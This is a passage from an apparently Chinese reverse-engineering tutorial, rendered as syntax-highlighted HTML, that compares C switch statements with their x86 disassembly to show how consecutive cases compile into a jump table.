class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">00401020</span> <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span> <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span> <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">00401026</span> <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span> <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">00401028</span> <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">00401029</span> <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">00401031</span> B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401036</span> F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">00401038</span> <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040103B</span> <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040103</span>E <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">00401041</span> <span class=\"number\">83</span> E9 <span class=\"number\">01</span>             sub         ecx,<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">00401044</span> <span class=\"number\">89</span> <span class=\"number\">4</span>D FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">00401047</span> <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">03</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040104B</span> <span class=\"number\">77</span> <span class=\"number\">46</span>                ja          $L539+<span class=\"number\">0F</span>h (<span class=\"number\">00401093</span>)</span><br><span class=\"line\"><span class=\"number\">0040104</span>D <span class=\"number\">8B</span> <span class=\"number\">55</span> FC             mov         edx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">00401050</span> FF <span class=\"number\">24</span> <span class=\"number\">95</span> B1 <span class=\"number\">10</span> <span class=\"number\">40</span> <span class=\"number\">00</span> jmp         dword ptr [edx*<span class=\"number\">4</span>+<span class=\"number\">4010B</span>1h]</span><br><span class=\"line\">$L533:</span><br><span class=\"line\"><span class=\"number\">00401057</span> <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">0042202</span>c)</span><br><span class=\"line\"><span class=\"number\">0040105</span>C E8 DF <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       <span class=\"function\">call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401061 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">00401064 EB 3A                jmp         $L539+1<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">004010</span>a0)</span></span></span><br><span class=\"line\"><span class=\"function\">$L535:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401066</span> <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;2&quot;</span> (<span class=\"number\">00422028</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040106B</span> E8 D0 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401070</span> <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401073</span> EB <span class=\"number\">2B</span>                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">004010</span>a0)</span></span><br><span class=\"line\"><span class=\"function\">$L537:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401075</span> <span class=\"number\">68</span> <span class=\"number\">24</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;3&quot;</span> (<span class=\"number\">00422024</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040107</span>A E8 C1 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040107F</span> <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401082</span> EB <span class=\"number\">1</span>C                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">004010</span>a0)</span></span><br><span class=\"line\"><span class=\"function\">$L539:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401084</span> <span class=\"number\">68</span> <span class=\"number\">20</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;4&quot;</span> (<span class=\"number\">00422020</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401089</span> E8 B2 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040108</span>E <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401091</span> EB <span class=\"number\">0</span>D                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">004010</span>a0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401093</span> <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;5&quot;</span> (<span class=\"number\">0042201</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401098</span> E8 A3 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040109</span>D <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A0 <span class=\"number\">5F</span>                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A1 <span class=\"number\">5</span>E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A2 <span class=\"number\">5B</span>                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A3 <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A6 <span class=\"number\">3B</span> EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A8 E8 <span class=\"number\">13</span> <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        __chkesp (<span class=\"number\">004011</span>c0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>AD <span class=\"number\">8B</span> E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>AF <span class=\"number\">5</span>D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010B</span>0 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">//case顺序交换不影响大表的生成，即可以是无序的</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123113122801.png\" alt=\"image-20230123113122801\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//只要case连续且数目足够就会生成大表</span></span><br><span class=\"line\"><span class=\"comment\">//case连续没有空缺</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">301</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">302</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">303</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">304</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">305</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">306</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;6&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">307</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;7&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">308</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;8&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">309</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;9&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">310</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sb&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D0 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D1 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D3 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D6 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D7 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D8 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D9 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E1 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E6 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E8 <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EB <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EE <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F1 <span class=\"number\">81</span> E9 <span class=\"number\">2</span>D <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span>    sub         ecx,<span class=\"number\">12</span>Dh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F7 <span class=\"number\">89</span> <span class=\"number\">4</span>D FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7FA <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">09</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FE <span class=\"number\">0F</span> <span class=\"number\">87</span> A6 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>    ja          $L551+<span class=\"number\">0F</span>h (<span class=\"number\">0040</span>d8aa)</span><br><span class=\"line\"><span class=\"number\">0040</span>D804 <span class=\"number\">8B</span> <span class=\"number\">55</span> FC             mov         edx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D807 FF <span class=\"number\">24</span> <span class=\"number\">95</span> C8 D8 <span class=\"number\">40</span> <span class=\"number\">00</span> jmp         dword ptr [edx*<span class=\"number\">4</span>+<span class=\"number\">40</span>D8C8h]</span><br><span class=\"line\">$L533:</span><br><span class=\"line\"><span class=\"number\">0040</span>D80E <span class=\"number\">68</span> C0 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">00422f</span>c0)</span><br><span class=\"line\"><span class=\"number\">0040</span>D813 E8 <span class=\"number\">28</span> <span class=\"number\">39</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D818 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D81B E9 97 00 00 00       jmp         $L551+1<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040</span>d8b7)</span></span></span><br><span class=\"line\"><span class=\"function\">$L535:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D820 <span class=\"number\">68</span> BC <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;2&quot;</span> (<span class=\"number\">00422f</span>bc)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D825 E8 <span class=\"number\">16</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82A <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82D E9 <span class=\"number\">85</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L537:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D832 <span class=\"number\">68</span> B8 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;3&quot;</span> (<span class=\"number\">00422f</span>b8)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D837 E8 <span class=\"number\">04</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83C <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83F EB <span class=\"number\">76</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span 